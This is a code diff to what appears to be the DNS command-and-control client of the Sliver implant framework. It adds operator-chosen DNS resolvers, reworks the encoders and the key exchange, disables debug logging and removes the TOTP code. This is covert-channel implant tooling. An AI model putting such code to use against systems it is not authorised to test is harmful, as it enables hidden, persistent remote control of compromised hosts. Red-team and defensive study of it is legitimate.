@@ -103,6 +103,7 @@ type DNSOptions struct {
 	WorkersPerResolver int
 	ForceBase32        bool
 	ForceResolvConf    string
+	ForceResolvers     string
 }
 
 // ParseDNSOptions - Parse c2 specific options
@@ -141,6 +142,7 @@ func ParseDNSOptions(c2URI *url.URL) *DNSOptions {
 		WorkersPerResolver: workersPerResolver,
 		ForceBase32:        strings.ToLower(c2URI.Query().Get("force-base32")) == "true",
 		ForceResolvConf:    c2URI.Query().Get("force-resolv-conf"),
+		ForceResolvers:     c2URI.Query().Get("resolvers"),
 	}
 }
 
@@ -166,6 +168,7 @@ func NewDNSClient(parent string, opts *DNSOptions) *SliverDNSClient {
 		parent:          parent,
 		forceBase32:     opts.ForceBase32,
 		forceResolvConf: opts.ForceResolvConf,
+		forceResolvers:  opts.ForceResolvers,
 		queryTimeout:    opts.QueryTimeout,
 		retryWait:       opts.RetryWait,
 		retryCount:      opts.RetryCount,
@@ -173,8 +176,8 @@ func NewDNSClient(parent string, opts *DNSOptions) *SliverDNSClient {
 
 		WorkersPerResolver: opts.WorkersPerResolver,
 		subdataSpace:       254 - len(parent) - (1 + (254-len(parent))/64),
-		base32:             encoders.Base32{},
-		base58:             encoders.Base58{},
+		base32:             encoders.Base32Encoder{},
+		base58:             encoders.Base58Encoder{},
 	}
 }
 
@@ -190,6 +193,7 @@ type SliverDNSClient struct {
 	queryTimeout    time.Duration
 	forceBase32     bool
 	forceResolvConf string
+	forceResolvers  string
 	subdataSpace    int
 	dnsSessionID    uint32
 	msgCount        uint32
@@ -201,8 +205,8 @@ type SliverDNSClient struct {
 	workerPool         []*DNSWorker
 	WorkersPerResolver int
 
-	base32 encoders.Base32
-	base58 encoders.Base58
+	base32 encoders.Base32Encoder
+	base58 encoders.Base58Encoder
 
 	enableCaseSensitiveEncoder bool
 }
@@ -308,9 +312,9 @@ func (s *SliverDNSClient) SessionInit() error {
 	}
 
 	// Key agreement with server
-	sKey := cryptography.RandomKey()
+	sKey := cryptography.RandomSymmetricKey()
 	s.cipherCtx = cryptography.NewCipherContext(sKey)
-	initData, err := cryptography.ECCEncryptToServer(sKey[:])
+	initData, err := cryptography.AgeKeyExToServer(sKey[:])
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("[dns] failed to encrypt init msg %v", err)
@@ -544,7 +548,8 @@ func (s *SliverDNSClient) parallelRecv(manifest *dnspb.DNSMessage) ([]byte, erro
 			Stop:  stop,
 		})
 		// This message will always fit in base32
-		domain, err := s.joinSubdataToParent(string(s.base32.Encode(recvMsg)))
+		encodedMsg, _ := s.base32.Encode(recvMsg)
+		domain, err := s.joinSubdataToParent(string(encodedMsg))
 		if err != nil {
 			return nil, err
 		}
@@ -646,19 +651,20 @@ func (s *SliverDNSClient) SplitBuffer(msg *dnspb.DNSMessage, encoder encoders.En
 		// Sometimes adding a byte will result in +2 chars so we -1 the subdata space
 		encoded = ""
 		// {{if .Config.Debug}}
-		log.Printf("[dns] encoded: %d, subdata space: %d | stop: %d, len: %d",
-			len(encoded), (s.subdataSpace - 1), stop, len(data))
+		//log.Printf("[dns] encoded: %d, subdata space: %d | stop: %d, len: %d",
+		//	len(encoded), (s.subdataSpace - 1), stop, len(data))
 		// {{end}}
 		for len(encoded) < (s.subdataSpace-1) && stop < len(data) {
 			stop++
 			// {{if .Config.Debug}}
-			log.Printf("[dns] shave data [%d:%d] of %d", start, stop, len(data))
+			// log.Printf("[dns] shave data [%d:%d] of %d", start, stop, len(data))
 			// {{end}}
 			msg.Data = data[start:stop]
 			pbMsg, _ := proto.Marshal(msg)
-			encoded = string(encoder.Encode(pbMsg))
+			encodedValue, _ := encoder.Encode(pbMsg)
+			encoded = string(encodedValue)
 			// {{if .Config.Debug}}
-			log.Printf("[dns] encoded length is %d (max: %d)", len(encoded), s.subdataSpace)
+			// log.Printf("[dns] encoded length is %d (max: %d)", len(encoded), s.subdataSpace)
 			// {{end}}
 		}
 		lastLen = len(msg.Data) // Save the amount of data that fit for the next loop
@@ -678,7 +684,7 @@ func (s *SliverDNSClient) SplitBuffer(msg *dnspb.DNSMessage, encoder encoders.En
 
 	// {{if .Config.Debug}}
 	total := 0
-	for index, domain := range encodedSubdata {
+	for _, domain := range encodedSubdata {
 		dnsMsg := &dnspb.DNSMessage{}
 		rawData, err := encoder.Decode([]byte(domain))
 		if err != nil {
@@ -687,8 +693,8 @@ func (s *SliverDNSClient) SplitBuffer(msg *dnspb.DNSMessage, encoder encoders.En
 		}
 		proto.Unmarshal(rawData, dnsMsg)
 		total += len(dnsMsg.Data)
-		log.Printf("[dns] subdata %d (%d->%d): %d bytes",
-			index, dnsMsg.Start, int(dnsMsg.Start)+len(dnsMsg.Data), len(dnsMsg.Data))
+		// log.Printf("[dns] subdata %d (%d->%d): %d bytes",
+		// 	index, dnsMsg.Start, int(dnsMsg.Start)+len(dnsMsg.Data), len(dnsMsg.Data))
 	}
 	log.Printf("[dns] original data: %d bytes", len(data))
 	log.Printf("[dns] total subdata: %d bytes", total)
@@ -738,13 +744,33 @@ func (s *SliverDNSClient) getDNSSessionID() error {
 
 func (s *SliverDNSClient) loadResolvConf() error {
 	var err error
-	if len(s.forceResolvConf) < 1 {
+	if len(s.forceResolvConf) < 1 && s.forceResolvers == "" {
 		s.resolvConf, err = dnsClientConfig()
+	} else if s.forceResolvers != "" {
+		// Convert the specified resolvers into a string that dns.ClientConfigFromReader can understand
+		// Strip out spaces and split on commas
+		resolversSlice := strings.Split(s.forceResolvers, " ")
+		s.resolvConf, err = dns.ClientConfigFromReader(strings.NewReader("nameserver " + strings.Join(resolversSlice, "\nnameserver ")))
+		if err != nil {
+			// {{if .Config.Debug}}
+			log.Printf("[dns] Error trying to use specified resolvers (%s): %s", s.forceResolvers, err.Error())
+			// {{end}}
+		} else {
+			// {{if .Config.Debug}}
+			log.Printf("[dns] Using specified DNS resolvers: %s", s.forceResolvers)
+			// {{end}}
+		}
 	} else {
-		// {{if .Config.Debug}}
-		log.Printf("[dns] Using forced resolv.conf: %s", s.forceResolvConf)
-		// {{end}}
 		s.resolvConf, err = dns.ClientConfigFromReader(strings.NewReader(s.forceResolvConf))
+		if err != nil {
+			// {{if .Config.Debug}}
+			log.Printf("[dns] Error trying to use forced resolv.conf (%s): %s", s.forceResolvConf, err.Error())
+			// {{end}}
+		} else {
+			// {{if .Config.Debug}}
+			log.Printf("[dns] Using forced resolv.conf: %s", s.forceResolvConf)
+			// {{end}}
+		}
 	}
 	return err
 }
@@ -780,27 +806,25 @@ func (s *SliverDNSClient) pollMsg(meta *ResolverMetadata) (string, error) {
 		Data: nonceBuf,
 	})
 	if s.enableCaseSensitiveEncoder {
-		return string(s.base58.Encode(pollMsg)), nil
+		msg, _ := s.base58.Encode(pollMsg)
+		return string(msg), nil
 	} else {
-		return string(s.base32.Encode(pollMsg)), nil
+		msg, _ := s.base32.Encode(pollMsg)
+		return string(msg), nil
 	}
 }
 
 func (s *SliverDNSClient) otpMsg() (string, error) {
-	otpCode := cryptography.GetOTPCode()
-	otp, err := strconv.Atoi(otpCode)
-	if err != nil {
-		return "", err
-	}
 	otpMsg := &dnspb.DNSMessage{
 		Type: dnspb.DNSMessageType_TOTP,
-		ID:   uint32(otp), // Take advantage of the variable length encoding
+		ID:   uint32(0), // Take advantage of the variable length encoding
 	}
 	data, err := proto.Marshal(otpMsg)
 	if err != nil {
 		return "", err
 	}
-	return string(s.base32.Encode(data)), nil
+	msg, _ := s.base32.Encode(data)
+	return string(msg), nil
 }
 
 // fingerprintResolver - Fingerprints resolve to determine if we can use a case sensitive encoding
@@ -888,7 +912,8 @@ func (s *SliverDNSClient) benchmark(id int, encoder encoders.Encoder, resolver D
 			// {{end}}
 			continue
 		}
-		domain, err := s.joinSubdataToParent(string(encoder.Encode(finger)))
+		encodedValue, _ := encoder.Encode(finger)
+		domain, err := s.joinSubdataToParent(string(encodedValue))
 		if err != nil {
 			meta.Errors++
 			// {{if .Config.Debug}}
